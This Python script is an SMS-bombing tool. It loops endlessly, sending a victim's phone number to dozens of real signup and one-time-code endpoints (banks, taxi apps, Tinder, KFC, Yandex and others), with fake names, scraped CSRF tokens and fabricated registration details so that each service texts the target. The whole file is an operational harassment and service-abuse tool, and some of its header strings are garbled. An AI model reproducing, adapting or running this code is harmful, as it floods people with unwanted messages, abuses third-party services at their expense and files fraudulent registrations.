import requests
import random
import string

def send_for_number(phone):
    names = ["Саша","Ярослав","Дмитрий","Елизавета","Света","Ангелина","Алена","Вика","Михаил"]
    domens = ["@mail.ru","@yandex.ru","@gmail.com"]
    while True:
        request_timeout = 0.0000002
        phone1 = '+' + phone[0] + ' ' + '(' + phone[1] + phone[2] + phone[3] + ')' + " " + phone[4] + phone[5] + phone[
            6] + '-' + phone[7] + phone[8] + '-' + phone[9] + phone[10]
        phone2 = phone[1] + phone[2] + phone[3] + phone[4] + phone[5] + phone[6] + phone[7] + phone[8] + phone[9] + \
                 phone[10]

        try:
            requests.post('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru',
                          data={'phone_number': phone})
        except Exception as e:
            pass

        try:
            requests.post('https://api.tinkoff.ru/v1/sign_up', data={'phone': '+' + phone})
        except Exception as e:
            pass

        try:
            requests.post("https://api.mtstv.ru/v1/users", data={'msisdn': phone})
        except Exception as e:
            pass

        try:
            a = requests.get('https://driver.gett.ru/signup/')
            requests.post('https://driver.gett.ru/api/login/phone/', data={'phone': phone, 'registration': 'true'},
                          headers={'Accept-Encoding': 'gzip, deflate, br', 'Accept-Language': 'en-US,en;q=0.5',
                                   'Connection': 'keep-alive', 'Cookie': 'csrftoken=' + a.cookies[
                                  'csrftoken'] + '; _ym_uid=1547234164718090157; _ym_d=1547234164; _ga=GA1.2.2109386105.1547234165; _ym_visorc_46241784=w; _gid=GA1.2.1423572947.1548099517; _gat_gtag_UA_107450310_1=1; _ym_isad=2',
                                   'Host': 'driver.gett.ru (http://driver.gett.ru/)',
                                   'Referer': 'https://driver.gett.ru/signup/',
                                   'User-Agent': 'Mozilla/5.0 (https://driver.gett.ru/signup/',
                                   'User-Agent': 'Mozilla/5.0) (X11; Ubuntu; Linux x86_64; rv:64.0) Gecko/20100101 Firefox/64.0',
                                   'X-CSRFToken': a.cookies['csrftoken']})
        except Exception as e:
            pass

        try:
            requests.post('https://api.ivi.ru/mobileapi/user/register/phone/v6/', data={"phone": phone},
                          headers={'Accept-Language': 'ru-RU,ru;q=0.8,en-US;q=0.5,en;q=0.3', 'Connection': 'keep-alive',
                                   'Host': 'api.ivi.ru (http://api.ivi.ru/)', 'origin': 'https://www.ivi.ru/',
                                   'Referer': 'https://www.ivi.ru/profile (https://www.ivi.ru/',
                                   'Referer': 'https://www.ivi.ru/profile)'})
        except:
            pass

        try:
            b = requests.session()
            b.get('https://drugvokrug.ru/siteActions/processSms.htm')
            requests.post('https://drugvokrug.ru/siteActions/processSms.htm', data={'cell': phone},
                          headers={'Accept-Language': 'en-US,en;q=0.5', 'Connection': 'keep-alive',
                                   'Cookie': 'JSESSIONID=' + b.cookies['JSESSIONID'] + ';',
                                   'Host': 'drugvokrug.ru (http://drugvokrug.ru/)', 'Referer': 'https://drugvokrug.ru/',
                                   'User-Agent': 'Mozilla/5.0 (https://drugvokrug.ru/',
                                   'User-Agent': 'Mozilla/5.0) (X11; Ubuntu; Linux x86_64; rv:64.0) Gecko/20100101 Firefox/64.0',
                                   'X-Requested-With': 'XMLHttpRequest'})
        except Exception as e:
            pass

        # Добавленые сервисы
        try:
            rutaxi = requests.post('https://moscow.rutaxi.ru/ajax_keycode.html', data={'l': phone[1:]})
        except Exception as e:
            pass

        try:
            rutube = requests.post('https://rutube.ru/api/accounts/sendpass/phone', data={'phone': '+' + phone})
        except Exception as e:
            pass

        try:
            psbank = requests.post('https://ib.psbank.ru/api/authentication/extendedClientAuthRequest',
                                   json={'firstName': 'Иван', 'middleName': 'Иванович', 'lastName': 'Иванов',
                                         'sex': '1', 'birthDate': '10.10.2000', 'mobilePhone': phone[1:],
                                         'russianFederationResident': 'true', 'isDSA': 'false',
                                         'personalDataProcessingAgreement': 'true', 'bKIRequestAgreement': 'null',
                                         'promotionAgreement': 'true'})
        except Exception as e:
            pass

        try:
            beltelecom = requests.post('https://myapi.beltelecom.by/api/v1/auth/check-phone?lang=ru',
                                       data={'phone': phone})
        except Exception as e:
            pass

        try:
            modulbank = requests.post('https://my.modulbank.ru/api/v2/registration/nameAndPhone',
                                      json={'FirstName': 'Саша', 'CellPhone': phone[1:], 'Package': 'optimal'})
        except Exception as e:
            pass

        try:
            data = {

                'form[NAME]': 'Иван',
                'form[PERSONAL_GENDER]': 'M',
                'form[PERSONAL_BIRTHDAY]': '11.02.2000',
                'form[EMAIL]': 'fbhbdfvbd@gmail.com',
                'form[LOGIN]': phone1,
                'form[PASSWORD]': None,
                'get-new-password': 'Получите пароль по SMS',
                'user_agreement': 'on',
                'personal_data_agreement': 'on',
                'formType': 'full',
                'utc_offset': 180
            }
            aptkru = requests.post('https://apteka.ru/_action/auth/getForm/', data=data)
        except Exception as e:
            pass

        try:
            tvzavr = requests.post(
                'https://www.tvzavr.ru/api/3.1/sms/send_confirm_code?plf=tvz&phone=' + phone + '&csrf_value=a222ba2a464543f5ac6ad097b1e92a49 (https://www.tvzavr.ru/api/3.1/sms/send_confirm_code?plf=tvz&phone=%27+phone+%27&csrf_value=a222ba2a464543f5ac6ad097b1e92a49)')
        except Exception as e:
            pass

        try:
            cook = requests.post('https://www.netprint.ru/order/profile')

            headers = {
                'Accept': 'application/json, text/javascript, */*; q=0.01',
                'Accept-Encoding': 'gzip, deflate, br',
                'Accept-Language': 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7',
                'Connection': 'keep-alive',
                'Content-Length': 145,
                'Cookie': 'unbi=' + cook.cookies['unbi'],
                'Host': 'www.netprint.ru',
                'Origin': 'https://www.netprint.ru',
                'Referer': 'https://www.netprint.ru/order/profile',
                'Sec-Fetch-Mode': 'cors',
                'Sec-Fetch-Site': 'same-origin',
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.97 Safari/537.36 OPR/65.0.3467.48',
                'X-Requested-With': 'XMLHttpRequest'
            }

            netprint = requests.post('https://www.netprint.ru/order/social-auth', headers=headers,
                                     data={'operation': 'stdreg', 'email_or_phone': phone, 'i_agree_with_terms': 1})
        except Exception as e:
            pass

        try:
            requests.post('http://youdrive.today/login/web/phone', data={'phone': phone, 'phone_code': 7})
        except Exception as e:
            pass

        try:
            requests.get(
                'https://www.oyorooms.com/api/pwa/generateotp?phone=' + phone + '&country_code=%2B7&nod=4&locale=en')
        except Exception as e:
            pass

        try:
            requests.post("https://api.carsmile.com/",
                          json={"operationName": "enterPhone", "variables": {"phone": phone},
                                "query": "mutation enterPhone($phone: String!) {\n  enterPhone(phone: $phone)\n}\n"})
        except Exception as e:
            pass

        try:
            requests.post("https://api.delitime.ru/api/v2/signup",
                          data={"SignupForm[username]": phone, "SignupForm[device_type]": 3})
        except Exception as e:
            pass

        try:
            requests.post('https://www.icq.com/smsreg/requestPhoneValidation.php',
                          data={'msisdn': phone, "locale": 'en', 'countryCode': 'ru',
                                'version': '1', "k": "ic1rtwz1s1Hj1O0r", "r": "46763"})
        except Exception as e:
            pass

        try:
            requests.post("https://terra-1.indriverapp.com/api/authorization?locale=ru",
                          data={"mode": "request", "phone": "+" + phone,
                                "phone_permission": "unknown", "stream_id": 0, "v": 3, "appversion": "3.20.6",
                                "osversion": "unknown", "devicemodel": "unknown"})
        except Exception as e:
            pass

        try:
            password = ''.join(random.choice(string.ascii_letters) for _ in range(6))
            requests.post("https://lk.invitro.ru/sp/mobileApi/createUserByPassword",
                          data={"password": password, "application": "lkp", "login": "+" + phone})
        except Exception as e:
            pass

        try:
            requests.post('https://ube.pmsm.org.ru/esb/iqos-phone/validate',
                          json={"phone": phone})
        except Exception as e:
            pass

        try:
            requests.post('https://app.karusel.ru/api/v1/phone/', data={'phone': phone})
        except Exception as e:
            pass

        try:
            requests.post('https://app-api.kfc.ru/api/v1/common/auth/send-validation-sms', json={'phone': '+' + phone})
        except Exception as e:
            pass

        try:
            requests.post('https://cloud.mail.ru/api/v2/notify/applink',
                          json={"phone": "+" + phone, "api": 2, "email": "email",
                                "x-email": "x-email"})
        except Exception as e:
            pass

        try:
            requests.post("https://ok.ru/dk?cmd=AnonymRegistrationEnterPhone&st.cmd=anonymRegistrationEnterPhone",
                          data={"st.r.phone": "+" + phone})
        except Exception as e:
            pass

        try:
            requests.post("https://qlean.ru/clients-api/v2/sms_codes/auth/request_code",
                          json={"phone": phone})
        except Exception as e:
            pass

        try:
            requests.post("https://api.wowworks.ru/v2/site/send-code",
                          json={"phone": phone, "type": 2})
        except Exception as e:
            pass

        try:
            requests.post('https://eda.yandex/api/v1/user/request_authentication_code',
                          json={"phone_number": "+" + phone})
        except Exception as e:
            pass

        try:
            topPHONE = '+' + phone[0] + '(' + phone[1] + phone[2] + phone[3] + ')' + phone[4] + phone[5] + phone[
                6] + '-' + phone[7] + phone[8] + '-' + phone[9] + phone[10]
            topshop = requests.post('https://www.top-shop.ru/login/loginByPhone/', data={'phone': topPHONE})
        except Exception as e:
            pass

        try:
            name = random.choice(names)
            mailr = name + "".join(random.choice(string.ascii_lowercase) for i in range(5)) + random.choice(domens)
            requests.post("https://zoloto585.ru/api/bcard/reg/", json={
                "name": name,
                "surname": name,
                "patronymic": name,
                "sex": "m",
                "birthdate": "11.11.1999",
                "phone":  phone1,
                "email": mailr,
                "city": "Москва"
            })
        except Exception as e:
            print(e)

        try:
            requests.post("https://3040.com.ua/taxi-ordering", {"callback-phone": phone1})
        except Exception as e:
            print(e)

        try:
            requests.post("https://win.1admiralxxx.ru/api/en/register.json", json= {
                "mobile": phone1,
                "bonus": "signup",
                "agreement": 1,
                "currency": "RUB",
                "submit": 1,
                "email": "",
                "lang": "en",
            })
        except Exception as e:
            print(e)